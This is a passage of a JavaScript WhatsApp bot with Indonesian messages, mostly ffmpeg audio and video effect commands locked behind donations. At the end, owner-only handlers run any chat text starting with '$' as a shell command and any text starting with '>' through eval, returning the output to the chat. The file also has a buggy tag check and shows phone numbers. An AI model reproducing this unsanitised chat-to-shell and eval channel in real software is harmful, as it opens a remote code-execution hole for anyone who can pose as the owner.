		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp3')
		exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
			fs.unlinkSync(media)
			if (err) return reply('Error!')
			hah = fs.readFileSync(ran)
			Revoer.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fgi })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Send Audio Sukses Broh'))
			fs.unlinkSync(ran)
		})
		break
	//bass Bernada Besar Dan Getar
	case 'bass':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp3')
		exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
			fs.unlinkSync(media)
			if (err) return reply('Error!')
			hah = fs.readFileSync(ran)
			Revoer.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fgi })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Send Audio Sukses...'))
			fs.unlinkSync(ran)
		})
		break

	case 'budek':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo

		media = await Revoer.downloadAndSaveMediaMessage(encmedia)

		ran = getRandom('.mp3')

		exec(`ffmpeg -i ${media} -filter:a "volume=200" ${ran}`, (err, stderr, stdout) => {

			fs.unlinkSync(media)

			if (err) return reply('Error!')

			res = fs.readFileSync(ran)

			Revoer.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: fgi })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Send Audio Sukses Dek'))
			fs.unlinkSync(ran)

		})

		break

	//ghost  Bernada Serem Dan Menakutkan
	case 'ghost':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp3')
		exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
			fs.unlinkSync(media)
			if (err) return reply('Error!')
			hah = fs.readFileSync(ran)
			Revoer.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fvoc })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Send Audio Sukses...'))
			fs.unlinkSync(ran)
		})
		break


	case 'hode':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp3')
		exec(`ffmpeg -i ${media} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
			fs.unlinkSync(media)
			if (err) return reply('Error!')
			hah = fs.readFileSync(ran)
			Revoer.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fvoc })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Send Audio Success..'))
			fs.unlinkSync(ran)
		})
		break

	case 'robot':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek

		media = await Revoer.downloadAndSaveMediaMessage(encmedia)

		ran = getRandom('.mp3')

		exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {

			fs.unlinkSync(media)

			if (err) return reply('Error!')

			res = fs.readFileSync(ran)

			Revoer.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: fvoc })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Send Audio Success...'))
			fs.unlinkSync(ran)

		})

		break

	case 'imut':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek

		media = await Revoer.downloadAndSaveMediaMessage(encmedia)

		ran = getRandom('.mp3')

		exec(`ffmpeg -i ${media} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {

			fs.unlinkSync(media)

			if (err) return reply('Error!')

			res = fs.readFileSync(ran)

			Revoer.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: fvoc })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Send Audio Success!!'))
			fs.unlinkSync(ran)

		})
		
		break
	// EDITOR VIDEO //
	case 'tomp3':
		case 'to mp3' :
	
		if (!isQuotedVideo) return reply('```Reply videonya!```')
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp4')
		exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply(`Err: ${err}`)
			buffer453 = fs.readFileSync(ran)
			Revoer.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: fvoc })
			fs.unlinkSync(ran)
		})
		break
	case 'faster':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (!isQuotedVideo) return fakevn('Reply videonya!')
		fakevn(mess.wait)
		encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp4')
		exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return fakevn(`Err: ${err}`)
			buffer453 = fs.readFileSync(ran)
			Revoer.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
			fs.unlinkSync(ran)
		})
		break
	case 'slow':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (!isQuotedVideo) return fakevn('Reply videonya!')
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp4')
		exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return fakevn(`Err: ${err}`)
			buffer453 = fs.readFileSync(ran)
			Revoer.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
			fs.unlinkSync(ran)
		})
		break
	case 'reverse':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (!isQuotedVideo) return fakevn('```Reply videonya!```')
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp4')
		exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return fakevn(`Err: ${err}`)
			buffer453 = fs.readFileSync(ran)
			Revoer.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
			fs.unlinkSync(ran)
		})
		break

	case 'mirror':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (!isQuotedVideo) return fakevn('```Reply videonya!```')
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp4')
		exec(`ffmpeg -i ${media} -filter:v "split [main][tmp]; [tmp] crop=iw:ih/2:0:0, vflip [flip]; [main][flip] overlay=0:H/2" ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return fakevn(`Err: ${err}`)
			buffer453 = fs.readFileSync(ran)
			Revoer.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
			fs.unlinkSync(ran)
		})
		break


	case 'hitamputih':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (!isQuotedVideo) return fakevn('```Reply videonya!```')
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp4')
		exec(`ffmpeg -y -i ${media} -strict experimental -vf hue=s=0 -vcodec mpeg4 -b 2097152 -r 30 ${ran} `, (err) => {
			fs.unlinkSync(media)
			if (err) return fakevn(`Err: ${err}`)
			buffer453 = fs.readFileSync(ran)
			Revoer.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
			fs.unlinkSync(ran)
		})
		break

	case 'nosound':

		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (!isQuotedVideo) return fakevn('```Reply videonya!```')
		fakevn(mess.wait)
		encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp4')
		exec(`ffmpeg -i ${media} -vcodec copy -an ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return fakevn(`Err: ${err}`)
			buffer453 = fs.readFileSync(ran)
			Revoer.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
			fs.unlinkSync(ran)
		})
		break


//━━━━━━━━━━━━━━━[ AKHIR DARI SEMUA FITUR ]━━━━━━━━━━━━━━━━━//
				
	default:
		if (budy.includes('@6285736891082' && '@62895338578959')) {
			AjgTag = fs.readFileSync('./media/ditag.webp')
			Revoer.sendMessage(from, AjgTag, sticker, { quoted: mek })
			const ngetag = fs.readFileSync('./media/tag.wav')
			Revoer.sendMessage(from, ngetag , audio, { mimetype: 'audio/mp4', ptt: true, quoted: fgi })
		}
if (isOwner) {
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (isOwner) {
if (budy.startsWith('>')) {
console.log(color('[ EVAL ]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
reply(`${evaled}`)
} catch (err) {
reply(`${err}`)
}
}
}
}
}
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Error : %s', color(e, 'red'))
	Revoer.sendMessage(`${owner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Revz Ganteng Banget Angjay",body:"NOTICE ERROR BROH",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/vanz.jpeg'),sourceUrl:"https://wa.me/6285736891082"}}})
        }
	// console.log(e)
	}
}

